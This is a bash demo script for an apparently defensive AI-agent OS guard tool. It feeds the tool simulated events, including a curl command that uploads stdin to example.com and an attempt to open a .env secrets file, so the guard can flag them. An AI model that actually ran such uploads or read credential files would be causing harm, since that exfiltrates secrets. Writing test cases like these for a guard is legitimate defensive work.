#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
GUARD=(node "$ROOT/src/cli.js" --config "$ROOT/examples/404gent.os-guard.config.json")

printf "\n== OS Guard Demo MVP ==\n"
printf "This demo uses simulated OS events. It does not install or run macOS EndpointSecurity.\n"

printf "\n-- status --\n"
"${GUARD[@]}" os-guard status || true

printf "\n-- simulated guarded agent launch --\n"
"${GUARD[@]}" agent --name os-demo --with-os-guard -- node -e 'console.log("agent completed")' || true

printf "\n-- simulated AUTH_EXEC: curl --\n"
"${GUARD[@]}" os-guard simulate-exec curl https://example.com/upload -d @- --agent os-demo --pid 1234 || true

printf "\n-- simulated AUTH_OPEN: .env --\n"
"${GUARD[@]}" os-guard simulate-open .env --agent os-demo --pid 1234 || true

printf "\n-- state --\n"
"${GUARD[@]}" status --agent os-demo || true
